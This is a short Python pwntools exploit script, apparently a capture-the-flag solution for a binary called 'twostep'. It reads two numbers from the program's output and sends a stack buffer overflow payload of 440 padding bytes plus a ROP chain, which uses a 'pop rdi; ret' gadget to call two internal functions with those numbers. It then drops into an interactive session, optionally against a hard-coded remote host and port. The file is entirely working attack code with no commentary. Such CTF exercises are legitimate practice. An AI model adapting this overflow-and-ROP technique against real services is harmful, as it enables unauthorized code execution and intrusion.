#!/usr/bin/env python3
import re
from pwn import *

EXE = ELF("./twostep")
rop = ROP(EXE)

print(EXE.path)
if args.REMOTE:
    r = remote("165.227.103.166", 6003)
elif args.GDB:
    r = gdb.debug(EXE.path, "b main")
else:
    r = process(EXE.path)

right_foot_creep = EXE.symbols["right_foot_creep1"]
target_addr = EXE.symbols["left2_foot_creep_FORBIDDEN"]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

data = r.recvuntil(
    b"have any advice for a stepper such as myself to lock in and fix my 2 step game?\n"
).decode()

arg1 = re.findall("(\d+) HOURS and \d+ MINUTES,", data)[0]
arg1 = int(arg1)
arg2 = re.findall("\d+ HOURS and (\d+) MINUTES,", data)[0]
arg2 = int(arg2)

payload = (
    b"A" * 440
    + p64(pop_rdi)
    + p64(arg1)
    + p64(right_foot_creep)
    + p64(pop_rdi)
    + p64(arg2)
    + p64(target_addr)
)

r.sendline(payload)
r.interactive()
